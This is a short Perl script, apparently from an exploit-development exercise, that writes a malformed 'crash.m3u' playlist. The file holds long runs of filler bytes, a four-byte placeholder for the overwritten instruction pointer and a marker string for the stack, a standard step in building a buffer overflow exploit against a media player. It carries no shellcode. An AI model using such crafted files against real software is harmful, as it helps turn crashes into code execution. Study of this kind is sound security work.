#! /usr/bin/perl

my $file= "crash.m3u";

my $junk= "\x41" x 25000;
my $junk2= "\x42" x 1072;
my $eip= "\x43" x 4;
my $temp = "XXXX";
my $espdata="1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" .
"5ABCDEFGHIJK6ABCDEFGHIJK" .
"7ABCDEFGHIJK8ABCDEFGHIJK" .
"9ABCDEFGHIJKAABCDEFGHIJK".
"BABCDEFGHIJKCABCDEFGHIJK";

open($FILE,">$file");
print $FILE $junk.$junk2.$eip.$temp.$espdata;
close($FILE);
print "m3u File Created successfully\n";
